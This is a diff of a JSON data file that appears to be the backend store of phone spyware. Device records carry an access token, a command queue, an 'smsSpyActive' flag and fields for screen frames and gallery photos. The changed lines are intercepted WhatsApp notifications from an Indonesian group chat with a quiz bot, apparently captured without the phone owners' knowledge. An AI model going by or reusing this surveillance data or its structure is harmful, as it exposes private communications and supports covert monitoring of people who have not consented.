@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775046752787,
+    "lastSeen": 1775046755921,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13732 pesan): ~ Bot",
+        "content": "✅ Jawaban Benar! \nJawabannya adalah: petualang sejati\n\nSelamat kepada @⁨~🕷️⁩! 🎉\n🎁 Kamu mendapatkan hadiah +2 Limit Bot!",
+        "time": "01/04 20:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046757590
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15893 pesan dari 10 chat",
+        "time": "01/04 20:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046755375
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13731 pesan): ~ 🕷️",
@@ -4003,22 +4019,6 @@
         "time": "01/04 20:21",
         "pkg": "com.whatsapp",
         "receivedAt": 1775046111487
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13583 pesan): ~ Bot",
-        "content": "💟 Stiker",
-        "time": "01/04 20:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046107497
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15781 pesan dari 10 chat",
-        "time": "01/04 20:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046107447
       }
     ],
     "galleryPhotos": [],
@@ -4065,6 +4065,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15893 pesan dari 10 chat",
+        "time": "01/04 20:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046755398
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13731 pesan): ~ 🕷️",
+        "content": "petualang sejati",
+        "time": "01/04 20:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046755133
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -8048,22 +8064,6 @@
         "time": "01/04 20:21",
         "pkg": "com.whatsapp",
         "receivedAt": 1775046107520
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15781 pesan dari 10 chat",
-        "time": "01/04 20:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046107508
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13582 pesan): ~ Bot",
-        "content": "❌ Jawaban Salah untuk soal ini. Coba lagi!",
-        "time": "01/04 20:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046105709
       }
     ],
     "galleryPhotos": [],
